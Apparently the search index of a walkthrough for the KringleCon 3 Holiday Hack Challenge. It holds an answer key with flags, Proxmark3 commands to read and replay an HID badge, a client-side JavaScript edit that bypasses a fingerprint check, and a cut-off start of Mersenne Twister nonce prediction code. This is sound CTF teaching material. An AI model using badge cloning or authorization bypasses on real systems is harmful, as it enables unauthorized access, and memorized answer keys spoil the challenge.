{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"KringleCon 3: French Hens Write-up \u00b6 by Mo Sharif This year's KringleCon conference was full of exciting challenges and amazing talks. This guide will walk you through the objectives and terminal challenges for this conference. You can see some of the team members here that make KringoleCon possible: Enjoy!!!","title":"Home"},{"location":"#kringlecon-3-french-hens-write-up","text":"by Mo Sharif This year's KringleCon conference was full of exciting challenges and amazing talks. This guide will walk you through the objectives and terminal challenges for this conference. You can see some of the team members here that make KringoleCon possible: Enjoy!!!","title":"KringleCon 3: French Hens Write-up"},{"location":"misc/answers/","text":"Answers \u00b6 Here are the answers to this year's KringleCon: Objective 1 \u00b6 Proxmark Objective 2 \u00b6 North Pole: The Frostiest Place on Earth Objective 3 \u00b6 santapass Objective 4 \u00b6 Configure the panel as such to fully power the panel. Item Location Elevator Service Key Sparkle Redberry Green Bulb Courtyard (top left) Hex Bolt Dining Room Hex Bolt Entryway by Elevator Broken Candycane Front Lawn (near the passage to Entry) Red Bulb Talks Level Lobby near Chimney Scissorsticks Yellow Bulb Netwars level near Wunorse Openslae Objective 5 \u00b6 Find the Proxmark3 in Wrapping Room inside of Workshop. Read Shinny Upatree TAG ID using the Proxmark3 with the command lf hid read . Simulate Shinny Upatree TAG using the Proxmark3 with the command LF hid sim -r 2006e22f13 . Objective 6 \u00b6 The Lollipop Guild Objective 7 \u00b6 Exclude 19B Equals 0000000F2057 Exclude 080 Contains FFFFF Objective 8 \u00b6 JackFrostWasHere Objective 9 \u00b6 Tanta Kringle Objective 10 \u00b6 Find and replace && hastoken('besanta') with || hastoken('besanta') in app.js for elevator.kringlecastle.com . Save the file by pressing \"CTRL-S\" and click the fingerprint sensor. Objective 11a \u00b6 57066318f32f729d Objective 11b \u00b6 fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Answers"},{"location":"misc/answers/#answers","text":"Here are the answers to this year's KringleCon:","title":"Answers"},{"location":"misc/answers/#objective-1","text":"Proxmark","title":"Objective 1"},{"location":"misc/answers/#objective-2","text":"North Pole: The Frostiest Place on Earth","title":"Objective 2"},{"location":"misc/answers/#objective-3","text":"santapass","title":"Objective 3"},{"location":"misc/answers/#objective-4","text":"Configure the panel as such to fully power the panel. Item Location Elevator Service Key Sparkle Redberry Green Bulb Courtyard (top left) Hex Bolt Dining Room Hex Bolt Entryway by Elevator Broken Candycane Front Lawn (near the passage to Entry) Red Bulb Talks Level Lobby near Chimney Scissorsticks Yellow Bulb Netwars level near Wunorse Openslae","title":"Objective 4"},{"location":"misc/answers/#objective-5","text":"Find the Proxmark3 in Wrapping Room inside of Workshop. Read Shinny Upatree TAG ID using the Proxmark3 with the command lf hid read . Simulate Shinny Upatree TAG using the Proxmark3 with the command LF hid sim -r 2006e22f13 .","title":"Objective 5"},{"location":"misc/answers/#objective-6","text":"The Lollipop Guild","title":"Objective 6"},{"location":"misc/answers/#objective-7","text":"Exclude 19B Equals 0000000F2057 Exclude 080 Contains FFFFF","title":"Objective 7"},{"location":"misc/answers/#objective-8","text":"JackFrostWasHere","title":"Objective 8"},{"location":"misc/answers/#objective-9","text":"Tanta Kringle","title":"Objective 9"},{"location":"misc/answers/#objective-10","text":"Find and replace && hastoken('besanta') with || hastoken('besanta') in app.js for elevator.kringlecastle.com . Save the file by pressing \"CTRL-S\" and click the fingerprint sensor.","title":"Objective 10"},{"location":"misc/answers/#objective-11a","text":"57066318f32f729d","title":"Objective 11a"},{"location":"misc/answers/#objective-11b","text":"fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Objective 11b"},{"location":"misc/artmusic/","text":"Art and Music \u00b6 As always KringleCon has amazing music and art. This page contains examples of the art and details about where you can download your copy of the music. Art \u00b6 Here are some of the art in the KringleCon 3: Music \u00b6 The full music album can be downloaded at: KringleCon 3 Free Album Here are the titles: Dual Core - Falling Mary Ellen Kennel - I Wish I Could be Santa Claus Ninjula - Girl form Ipanema Ninjula - I could be Santa Ninjula - I saw Mommy kissing Santa Claws Ninjula - Need a little Xmas Ninjula - Santa Claws is back in town Ninjula - You're a maen one, Mr Grinch Josh Skoudis - I'm The Real Santa Josh Skoudis ft. Devin Kelly - Is That You Santa Clause.mp3","title":"Art/Music"},{"location":"misc/artmusic/#art-and-music","text":"As always KringleCon has amazing music and art. This page contains examples of the art and details about where you can download your copy of the music.","title":"Art and Music"},{"location":"misc/artmusic/#art","text":"Here are some of the art in the KringleCon 3:","title":"Art"},{"location":"misc/artmusic/#music","text":"The full music album can be downloaded at: KringleCon 3 Free Album Here are the titles: Dual Core - Falling Mary Ellen Kennel - I Wish I Could be Santa Claus Ninjula - Girl form Ipanema Ninjula - I could be Santa Ninjula - I saw Mommy kissing Santa Claws Ninjula - Need a little Xmas Ninjula - Santa Claws is back in town Ninjula - You're a maen one, Mr Grinch Josh Skoudis - I'm The Real Santa Josh Skoudis ft. Devin Kelly - Is That You Santa Clause.mp3","title":"Music"},{"location":"misc/booths/","text":"Booths \u00b6 This year KringleCon had five booths. Splunk \u00b6 Splunk is proud to be a contributor to KringleCon and the Holiday Hack Challenge. Happy Holidays from the Splunk security team! RSAConference \u00b6 Happy Holidays! Join us on January 27 for the new RSAC 365 Virtual Summit. Click to learn more about this one day program SWAG \u00b6 Link: https://teespring.com/stores/kringlecon-swag SANS.edu \u00b6 Happy holidays from the best college in cybersecurity! Brilliant minds like yours belong at SANS.edu . Google \u00b6 Google is a proud sponsor of KringleCon and the Holiday Hack Challenge. We wish you a happy holiday hacking season.","title":"Booths"},{"location":"misc/booths/#booths","text":"This year KringleCon had five booths.","title":"Booths"},{"location":"misc/booths/#splunk","text":"Splunk is proud to be a contributor to KringleCon and the Holiday Hack Challenge. Happy Holidays from the Splunk security team!","title":"Splunk"},{"location":"misc/booths/#rsaconference","text":"Happy Holidays! Join us on January 27 for the new RSAC 365 Virtual Summit. Click to learn more about this one day program","title":"RSAConference"},{"location":"misc/booths/#swag","text":"Link: https://teespring.com/stores/kringlecon-swag","title":"SWAG"},{"location":"misc/booths/#sansedu","text":"Happy holidays from the best college in cybersecurity! Brilliant minds like yours belong at SANS.edu .","title":"SANS.edu"},{"location":"misc/booths/#google","text":"Google is a proud sponsor of KringleCon and the Holiday Hack Challenge. We wish you a happy holiday hacking season.","title":"Google"},{"location":"misc/credits/","text":"SANS Holiday Hack Challenge 2020 'Zat You, Santa Claus? Direction Ed Skoudis Technical Lead Joshua Wright Narrative / Story Ed Skoudis & Chris Elgee World Builder Evan Booth World Wrangler Daniel Pendolino Programming Evan Booth Ron Bowes Chris Davis Chris Elgee Tom F. Liston Daniel Pendolino Joshua Wright System Builds & Administration Tom Hessman Daniel Pendolino Artwork Evan Booth Patrick Chapman Chris Davis Annie Royal Brenda van Rensburg Portrait Jessica Skoudis Voice Artists Whitney Champion Charles Shirer Ed Skoudis Bird Clang Challenge Development Patrick Barei\u00df Evan Booth Ron Bowes Chris Davis Chris Elgee Jose Hernandez Dave Herrald Tom Hessman Ryan Kovar Tom F. Liston Daniel Pendolino Marcus Stewart Joshua Wright Soundtrack Dual Core Mary Ellen Kennel Ninjula Josh Skoudis & Devin Kelly I Wish I Could Be Santa Claus by Paul Williams Mary Ellen Kennel - vocals Bob Telson - piano, arrangement & production, recording engineer, backing vocals Marc Shulman - electric & nylon string guitars, tiple Mastered by Jon Gordon Website Design Tom Hessman Conference Scheduler and Speaker Wrangler Jennifer Santiago Testing and Feedback Ron Bowes Michael \"Dop\" Dopheide Chris Elgee Vlad Grigorescu Tom Hessman Chet Kress Dave Mayer Clay Moody Jason Nickola Samuel (Sam) Oehlert Daniel Pendolino Salaheldin Lynn Schifano Ed Skoudis Marcus Stewart Eva van der Valk Joshua Wright KringleCon Speakers Ed Skoudis - Host Dan Banker Jay Beale Chris Elgee Spencer Gietzen Dave Herrald Tom F. Liston Jorge Orchilles Larry Pesce Jack Rhysider David Tomaschik Joshua Wright Marketing Jeff \"Elf\" Byma Patrick Chapman Tanya Van Kirk Jim Yacone Sponsored Hosting Services Google Special Thanks The SANS Institute \u00a9 Copyright SANS Institute, 2020. All Rights Reserved.","title":"Credits"},{"location":"misc/eastereggs/","text":"Eastereggs \u00b6 There are some easter eggs hidden in the game. Here are the ones I found: Nail \u00b6 This item is located at the Front Lawn (top left). When you click on the nail, it tells you the following: Job Hunting? Feeling Stuck? Join me for an interactive job hunting livestream! Any industry. Any type of job. No vendor pitches. Not selling anything. Just helping. https://www.twitch.tv/banjocrashland Santa's Portrait \u00b6 The origin of the portrait is unknown during most of the game. Santa refers to them as \"anonymous admirer\". The bottom of the portrait has the initial \"JFS\". I found \"Ed Skoudis\"'s picture on Twitter. The two do look somewhat similar. The narrative refers to the \"JFS\" signature as \"Jack Frost: Santa,\". During the credits, it's revealed that the portrait is by \"Jessica Skoudis\". A google search reveals that Jessica's middle name may start with F. This means her initials are also \"JFS\". The letters \"N\",\"d\" or \"o\",\"I\", could be seen in the top of the portrait, but I am not sure what it means. There may be additional layers to storyline in the game. Three French Hens \u00b6 The three French hens can be seen in the Front Lawn. These hens speak french to the players. However, when players speak to them as \"Santa\", they speak in English. \"mailbox.txt\" \u00b6 During the \"Kringle Kiosk\" terminal challenge, there is a mailbox.txt file that can be viewed. Jason the Plant! \u00b6 During the \"Kringle Kiosk\" terminal challenge, there is a plant.txt file that can be viewed. Richard F. Hall \u00b6 Link: Richard's website As players enter the \"front lawn\", they can view an advertisement sign for \"Richard F. Hall- Custom Homes LLC.\". This name is not listed in the credits. \"Santa\" does mention that the portrait he received is a housewarming present. Richard may be the designer for Santa's new castle.","title":"Easter eggs"},{"location":"misc/eastereggs/#eastereggs","text":"There are some easter eggs hidden in the game. Here are the ones I found:","title":"Eastereggs"},{"location":"misc/eastereggs/#nail","text":"This item is located at the Front Lawn (top left). When you click on the nail, it tells you the following: Job Hunting? Feeling Stuck? Join me for an interactive job hunting livestream! Any industry. Any type of job. No vendor pitches. Not selling anything. Just helping. https://www.twitch.tv/banjocrashland","title":"Nail"},{"location":"misc/eastereggs/#santas-portrait","text":"The origin of the portrait is unknown during most of the game. Santa refers to them as \"anonymous admirer\". The bottom of the portrait has the initial \"JFS\". I found \"Ed Skoudis\"'s picture on Twitter. The two do look somewhat similar. The narrative refers to the \"JFS\" signature as \"Jack Frost: Santa,\". During the credits, it's revealed that the portrait is by \"Jessica Skoudis\". A google search reveals that Jessica's middle name may start with F. This means her initials are also \"JFS\". The letters \"N\",\"d\" or \"o\",\"I\", could be seen in the top of the portrait, but I am not sure what it means. There may be additional layers to storyline in the game.","title":"Santa's Portrait"},{"location":"misc/eastereggs/#three-french-hens","text":"The three French hens can be seen in the Front Lawn. These hens speak french to the players. However, when players speak to them as \"Santa\", they speak in English.","title":"Three French Hens"},{"location":"misc/eastereggs/#mailboxtxt","text":"During the \"Kringle Kiosk\" terminal challenge, there is a mailbox.txt file that can be viewed.","title":"\"mailbox.txt\""},{"location":"misc/eastereggs/#jason-the-plant","text":"During the \"Kringle Kiosk\" terminal challenge, there is a plant.txt file that can be viewed.","title":"Jason the Plant!"},{"location":"misc/eastereggs/#richard-f-hall","text":"Link: Richard's website As players enter the \"front lawn\", they can view an advertisement sign for \"Richard F. Hall- Custom Homes LLC.\". This name is not listed in the credits. \"Santa\" does mention that the portrait he received is a housewarming present. Richard may be the designer for Santa's new castle.","title":"Richard F. Hall"},{"location":"misc/hints/","text":"Hints \u00b6 This page will provide various hints that were provided by the game for objectives and terminal challenges. Objective Hints \u00b6 Objective 1 Link: tools Objective 2 Link: search for unprotected buckets Link: finding these open S3 buckets Link: Amazon S3 buckets Link: talk Objective 3 Links: tools , guides Link: Electron Objective 4 Objective 5 Objective 6 Link: Talk Links: Cyber Chef Links: hunting them with Splunk Links: Splunk talk Objective 7 Objective 8 Objective 9 Link: command in a customized .deb file Objective 10 Objective 11a Link: hash collisions Links: hash collisions , UNIque hash COLLision , evil game , more Objective 11b Link: UNIque hash COLLision Link: evil game Link: a talk Terminal Hints \u00b6 Terminal Tip Linux Primer Use command line hintme for hints. Kringle Kiosk Link: command injection Unescape Tmux Link: https://tmuxcheatsheet.com/ Speaker UNPrep CAN-Bus Investigation Link: CAN traffic Redis Bug Hunt Link: This Scapy Prepper Use command line help() for hints. Snowball Game Link: https://snowball2.kringlecastle.com/ Link: https://docs.python.org/3/library/random.html Link: Mersenne Twister Link: predict Programming Concepts (The ELF C0DE) Link: JavaScript Links: JavaScript , JavaScript playground Link: make your code shorter Links: filter , typeof SORT-O-MATIC Link: https://regex101.com/ Link: https://www.debuggex.com/cheatsheet/regex/javascript","title":"Hints"},{"location":"misc/hints/#hints","text":"This page will provide various hints that were provided by the game for objectives and terminal challenges.","title":"Hints"},{"location":"misc/hints/#objective-hints","text":"Objective 1 Link: tools Objective 2 Link: search for unprotected buckets Link: finding these open S3 buckets Link: Amazon S3 buckets Link: talk Objective 3 Links: tools , guides Link: Electron Objective 4 Objective 5 Objective 6 Link: Talk Links: Cyber Chef Links: hunting them with Splunk Links: Splunk talk Objective 7 Objective 8 Objective 9 Link: command in a customized .deb file Objective 10 Objective 11a Link: hash collisions Links: hash collisions , UNIque hash COLLision , evil game , more Objective 11b Link: UNIque hash COLLision Link: evil game Link: a talk","title":"Objective Hints"},{"location":"misc/hints/#terminal-hints","text":"Terminal Tip Linux Primer Use command line hintme for hints. Kringle Kiosk Link: command injection Unescape Tmux Link: https://tmuxcheatsheet.com/ Speaker UNPrep CAN-Bus Investigation Link: CAN traffic Redis Bug Hunt Link: This Scapy Prepper Use command line help() for hints. Snowball Game Link: https://snowball2.kringlecastle.com/ Link: https://docs.python.org/3/library/random.html Link: Mersenne Twister Link: predict Programming Concepts (The ELF C0DE) Link: JavaScript Links: JavaScript , JavaScript playground Link: make your code shorter Links: filter , typeof SORT-O-MATIC Link: https://regex101.com/ Link: https://www.debuggex.com/cheatsheet/regex/javascript","title":"Terminal Hints"},{"location":"misc/items/","text":"Items \u00b6 This page outlines where to find the items in the game. These items are used in different objectives and challenges. Broken Candycane \u00b6 Location: Front Lawn passage to Entryway Usage: Fixing the Elevator Panel Item: Hex Nut (1) \u00b6 Location: Dining Room Usage: Fixing the Elevator Panel Item: Hex Nut (2) \u00b6 Location: Entryway by Elevator Usage: Fixing the Elevator Panel Item: Green Bulb \u00b6 Location: Courtyard behind Google booth Usage: Fixing the Elevator Panel Item: Elevator Service Key \u00b6 Location: Given to players by Sparkle Redberry Usage: Fixing the Elevator Panel Item: Red Bulb \u00b6 Location: Talks Lobby near Chimney Scissorsticks Usage: Fixing the Elevator Panel Item: Yellow Bulb \u00b6 Location: Netwars room near Wunorse Openslae Usage: Fixing the Elevator Panel Item: Elevator 1.5 Button \u00b6 Location: Speaker Unprep room Usage: For going to floor 1.5 on Elevator (Fixing Panel) Item: Portals \u00b6 Location: Vending machine in Speaker Unprep room Usage: For going to floor 1.5 on Elevator (Fixing Panel) Notes: The \"Speaker UNPrep\" Terminal challenge needs to be solved to obtain this item. Item: Vending Machine: HI. I AM OUT OF ORDER ... We're outta glazed donuts. We're outta jelly donuts. We're outta jelly donuts. We're outta Bavarian cream-filled donuts. We're outta cinnamon rolls. We're outta apple fritters. We're outta bear... wait a minute... ... ... ... WE'RE OUTTA BEAR CLAWS. All I've got are these Portal Candies. Enjoy! Can I interest you in a box of weasles, by chance? Large Marble \u00b6 Location: Workshop Usage: Fixing the Elevator Panel Item: Rubber Ball \u00b6 Location: Wrapping room above Workshop Usage: Fixing the Elevator Panel Item: Proxmark3 \u00b6 Location: Wrapping room above Workshop Usage: Used in Objective 5 for opening the HID Lock Item: \u00b6","title":"Items"},{"location":"misc/items/#items","text":"This page outlines where to find the items in the game. These items are used in different objectives and challenges.","title":"Items"},{"location":"misc/items/#broken-candycane","text":"Location: Front Lawn passage to Entryway Usage: Fixing the Elevator Panel Item:","title":"Broken Candycane"},{"location":"misc/items/#hex-nut-1","text":"Location: Dining Room Usage: Fixing the Elevator Panel Item:","title":"Hex Nut (1)"},{"location":"misc/items/#hex-nut-2","text":"Location: Entryway by Elevator Usage: Fixing the Elevator Panel Item:","title":"Hex Nut (2)"},{"location":"misc/items/#green-bulb","text":"Location: Courtyard behind Google booth Usage: Fixing the Elevator Panel Item:","title":"Green Bulb"},{"location":"misc/items/#elevator-service-key","text":"Location: Given to players by Sparkle Redberry Usage: Fixing the Elevator Panel Item:","title":"Elevator Service Key"},{"location":"misc/items/#red-bulb","text":"Location: Talks Lobby near Chimney Scissorsticks Usage: Fixing the Elevator Panel Item:","title":"Red Bulb"},{"location":"misc/items/#yellow-bulb","text":"Location: Netwars room near Wunorse Openslae Usage: Fixing the Elevator Panel Item:","title":"Yellow Bulb"},{"location":"misc/items/#elevator-15-button","text":"Location: Speaker Unprep room Usage: For going to floor 1.5 on Elevator (Fixing Panel) Item:","title":"Elevator 1.5 Button"},{"location":"misc/items/#portals","text":"Location: Vending machine in Speaker Unprep room Usage: For going to floor 1.5 on Elevator (Fixing Panel) Notes: The \"Speaker UNPrep\" Terminal challenge needs to be solved to obtain this item. Item: Vending Machine: HI. I AM OUT OF ORDER ... We're outta glazed donuts. We're outta jelly donuts. We're outta jelly donuts. We're outta Bavarian cream-filled donuts. We're outta cinnamon rolls. We're outta apple fritters. We're outta bear... wait a minute... ... ... ... WE'RE OUTTA BEAR CLAWS. All I've got are these Portal Candies. Enjoy! Can I interest you in a box of weasles, by chance?","title":"Portals"},{"location":"misc/items/#large-marble","text":"Location: Workshop Usage: Fixing the Elevator Panel Item:","title":"Large Marble"},{"location":"misc/items/#rubber-ball","text":"Location: Wrapping room above Workshop Usage: Fixing the Elevator Panel Item:","title":"Rubber Ball"},{"location":"misc/items/#proxmark3","text":"Location: Wrapping room above Workshop Usage: Used in Objective 5 for opening the HID Lock Item:","title":"Proxmark3"},{"location":"misc/items/#_1","text":"","title":""},{"location":"misc/map/","text":"North Pole Map and Directory \u00b6 The map and directory were obtained from the \"Kringle Kiosk\" Terminal. Map \u00b6 Directory \u00b6 Name: Floor: Room: Ribb Bonbowford 1 Dining Room Noel Boetie 1 Wrapping Room Ginger Breddie 1 Castle Entry Minty Candycane 1.5 Workshop Angel Candysalt 1 Great Room Tangle Coalbox 1 Speaker UNPreparedness Bushy Evergreen 2 Talks Lobby Holly Evergreen 1 Kitchen Bubble Lightington 1 Courtyard Jewel Loggins Front Lawn Sugarplum Mary 1 Courtyard Pepper Minstix Front Lawn Bow Ninecandle 2 Talks Lobby Morcel Nougat 2 Speaker UNPreparedness Wunorse Openslae R NetWars Room Sparkle Redberry 1 Castle Entry Jingle Ringford NJTP Piney Sappington 1 Castle Entry Chimney Scissorsticks 2 Talks Lobby Fitzy Shortstack 1 Kitchen Alabaster Snowball R NetWars Room Eve Snowshoes 3 Santa's Balcony Shinny Upatree Front Lawn Tinsel Upatree 3 Santa's Office","title":"Map/Directory"},{"location":"misc/map/#north-pole-map-and-directory","text":"The map and directory were obtained from the \"Kringle Kiosk\" Terminal.","title":"North Pole Map and Directory"},{"location":"misc/map/#map","text":"","title":"Map"},{"location":"misc/map/#directory","text":"Name: Floor: Room: Ribb Bonbowford 1 Dining Room Noel Boetie 1 Wrapping Room Ginger Breddie 1 Castle Entry Minty Candycane 1.5 Workshop Angel Candysalt 1 Great Room Tangle Coalbox 1 Speaker UNPreparedness Bushy Evergreen 2 Talks Lobby Holly Evergreen 1 Kitchen Bubble Lightington 1 Courtyard Jewel Loggins Front Lawn Sugarplum Mary 1 Courtyard Pepper Minstix Front Lawn Bow Ninecandle 2 Talks Lobby Morcel Nougat 2 Speaker UNPreparedness Wunorse Openslae R NetWars Room Sparkle Redberry 1 Castle Entry Jingle Ringford NJTP Piney Sappington 1 Castle Entry Chimney Scissorsticks 2 Talks Lobby Fitzy Shortstack 1 Kitchen Alabaster Snowball R NetWars Room Eve Snowshoes 3 Santa's Balcony Shinny Upatree Front Lawn Tinsel Upatree 3 Santa's Office","title":"Directory"},{"location":"misc/narrative/","text":"KringleCon Narrative \u00b6 The KringleCon narrative is the game's storyline. The narrative progresses as different objectives are solved. The full narrative can be viewed once all the objectives are completed. The Narrative \u00b6 KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null!","title":"Narrative"},{"location":"misc/narrative/#kringlecon-narrative","text":"The KringleCon narrative is the game's storyline. The narrative progresses as different objectives are solved. The full narrative can be viewed once all the objectives are completed.","title":"KringleCon Narrative"},{"location":"misc/narrative/#the-narrative","text":"KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null!","title":"The Narrative"},{"location":"misc/talks/","text":"KringleCon Talks \u00b6 Here is the list of talks available for KringleCon 3: Title (link) Speaker Notes START HERE: Welcome and Tips Ed Skoudis Intro and Tips Open S3 Buckets: Still a Problem In 2020 Josh Wright Related to Objective 2 CAN Bus Can-Can Chris Elgee Related to Objective 7 and CAN-Bus Investigation Working with the Official Naughty/Nice Blockchain... Prof. Qwerty Petabyte Related to Objective 11a and 11b Adversary Emulation and Automation Dave Herrald Related to Objective 6 HID Card Hacking Larry Pesce Related to Objective 5 Rudolph the Red-Nosed Raptor: Acquiring Triage Images via EDR Dan Banker Give Yourself a Blog for Christmas Jack Rhysider Darknet Diaries Red Teaming: Why Organizations Hack Themselves David Tomaschik IOMs vs. IOAs in AWS Spencer Gietzen Attacking and Hardening Kubernetes Jay Beale Random Facts About Mersenne Twisters Tom Liston Related to Snowball game and Objective 11a/11b Offensive Security Tools: Providing Value with the C2 Matrix Jorge Orchilles","title":"Talks"},{"location":"misc/talks/#kringlecon-talks","text":"Here is the list of talks available for KringleCon 3: Title (link) Speaker Notes START HERE: Welcome and Tips Ed Skoudis Intro and Tips Open S3 Buckets: Still a Problem In 2020 Josh Wright Related to Objective 2 CAN Bus Can-Can Chris Elgee Related to Objective 7 and CAN-Bus Investigation Working with the Official Naughty/Nice Blockchain... Prof. Qwerty Petabyte Related to Objective 11a and 11b Adversary Emulation and Automation Dave Herrald Related to Objective 6 HID Card Hacking Larry Pesce Related to Objective 5 Rudolph the Red-Nosed Raptor: Acquiring Triage Images via EDR Dan Banker Give Yourself a Blog for Christmas Jack Rhysider Darknet Diaries Red Teaming: Why Organizations Hack Themselves David Tomaschik IOMs vs. IOAs in AWS Spencer Gietzen Attacking and Hardening Kubernetes Jay Beale Random Facts About Mersenne Twisters Tom Liston Related to Snowball game and Objective 11a/11b Offensive Security Tools: Providing Value with the C2 Matrix Jorge Orchilles","title":"KringleCon Talks"},{"location":"obj/objective1/","text":"Objective 1 - Uncover Santa's Gift List \u00b6 Objective \u00b6 When you enter the game, you're greeted by Jingle Ringford. She has the following message for you: Jingle Ringford: Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa's castle! Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty. Click your badge (the snowflake in the center of your avatar) to read your objectives. If you'd like to chat with the community, join us on Discord! We have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel! If you get a minute, check out Ed Skoudis' official intro to the con! Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising billboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area. Walk-through \u00b6 Clicking on the billboard image will take you to this image . Download the image, you will need to upload it to a photo editing software to \"untwirl\" it. Using the hints she provides, you can use the \"Lasso tool\" on photopea.com to select the list. From Filter>Distort select Twirl. Change the Angle up and down until the list becomes readable. Answer \u00b6 Santa is planning to get Josh Wright a Proxmark .","title":"1) Uncover Santa's Gift List"},{"location":"obj/objective1/#objective-1-uncover-santas-gift-list","text":"","title":"Objective 1 - Uncover Santa's Gift List"},{"location":"obj/objective1/#objective","text":"When you enter the game, you're greeted by Jingle Ringford. She has the following message for you: Jingle Ringford: Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa's castle! Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty. Click your badge (the snowflake in the center of your avatar) to read your objectives. If you'd like to chat with the community, join us on Discord! We have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel! If you get a minute, check out Ed Skoudis' official intro to the con! Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising billboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area.","title":"Objective"},{"location":"obj/objective1/#walk-through","text":"Clicking on the billboard image will take you to this image . Download the image, you will need to upload it to a photo editing software to \"untwirl\" it. Using the hints she provides, you can use the \"Lasso tool\" on photopea.com to select the list. From Filter>Distort select Twirl. Change the Angle up and down until the list becomes readable.","title":"Walk-through"},{"location":"obj/objective1/#answer","text":"Santa is planning to get Josh Wright a Proxmark .","title":"Answer"},{"location":"obj/objective10/","text":"Objective 10 - Defeat Fingerprint Sensor \u00b6 Objective \u00b6 The fingerprint sensor is inside Santavator. Santa's fingerprint is required to enter Santa's Office. Walk-through \u00b6 To start this objective go to the Santavator and click on the Santavator panel. Open Chrome Developer Mode (Shift-CTRL-F11). Use the \"Inspect element\" tool to Inspect the fingerprint sensor. The fingerprint sensor has an element called print-cover , which is likely the cover for the sensor. Review the Sources for elevator.kringlecastle.com . Search for print-cover in app.js . Line 354 in app.js is looking for hastoken('besanta') . Change && to || , and press CTRL-S to save the file. Now press the fingerprint sensor, and it will take you to Santa's Office. Answer \u00b6 Find and replace && hastoken('besanta') with || hastoken('besanta') in app.js for elevator.kringlecastle.com . Save the file by pressing \"CTRL-S\" and click the fingerprint sensor.","title":"10) Defeat Fingerprint Sensor"},{"location":"obj/objective10/#objective-10-defeat-fingerprint-sensor","text":"","title":"Objective 10 - Defeat Fingerprint Sensor"},{"location":"obj/objective10/#objective","text":"The fingerprint sensor is inside Santavator. Santa's fingerprint is required to enter Santa's Office.","title":"Objective"},{"location":"obj/objective10/#walk-through","text":"To start this objective go to the Santavator and click on the Santavator panel. Open Chrome Developer Mode (Shift-CTRL-F11). Use the \"Inspect element\" tool to Inspect the fingerprint sensor. The fingerprint sensor has an element called print-cover , which is likely the cover for the sensor. Review the Sources for elevator.kringlecastle.com . Search for print-cover in app.js . Line 354 in app.js is looking for hastoken('besanta') . Change && to || , and press CTRL-S to save the file. Now press the fingerprint sensor, and it will take you to Santa's Office.","title":"Walk-through"},{"location":"obj/objective10/#answer","text":"Find and replace && hastoken('besanta') with || hastoken('besanta') in app.js for elevator.kringlecastle.com . Save the file by pressing \"CTRL-S\" and click the fingerprint sensor.","title":"Answer"},{"location":"obj/objective11a/","text":"Objective 11a - Naughty/Nice List with Blockchain Investigation Part 1 \u00b6 Objective \u00b6 Link: tools Tinsel Upatree tells you the following: Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. You can get some tools to help you here. Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue. For this objective, you need to be Santa. Go to Santa's office and click on the Naughty/Nice List on the table next to Tinsel Upatree. This will download the blockchain that you need for this objective. Walk-through \u00b6 The terminal challenge for this objective is the \"Snowball fight\" that is offered by Tangle Coalbox in the UNPreparedness room. Solving this terminal challenge provide additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective go to the Santa's Office and Download the blockchain data , OfficialNaughtyNiceBlockchainEducationPack.zip and mt19937.py . There is a talk that may be helpful for this challenge. To solve this challenge you need to read the blocks in blockchain.dat and extract the Nonces from each block. You will then need to feed the first 624 Nonces to the Mersenne Twister predictor (ex. mt19937.py). This will allow you to predict nonces. You then need to step through the Nonces until you reach the 130000 th Nonce. To do this, extract OfficialNaughtyNiceBlockchainEducationPack.zip. Add mt19937.py to the naughty_nice.py script. Add the following functions to naughty_nice.py : def SplitNonces ( hexNonce ): LSB = hexNonce [ 8 :] MSB = hexNonce [: 8 ] return MSB , LSB def MergeNonces ( a , b ): return ( b + \"\" + a ) def ToDec ( hexNonce ): return int ( hexNonce , 16 ) def ToHex ( dec ): return hex ( dec ) . split ( 'x' )[ - 1 ] Update the main of naughty_nice.py as follow: if __name__ == '__main__' : with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = RSA . importKey ( fh . 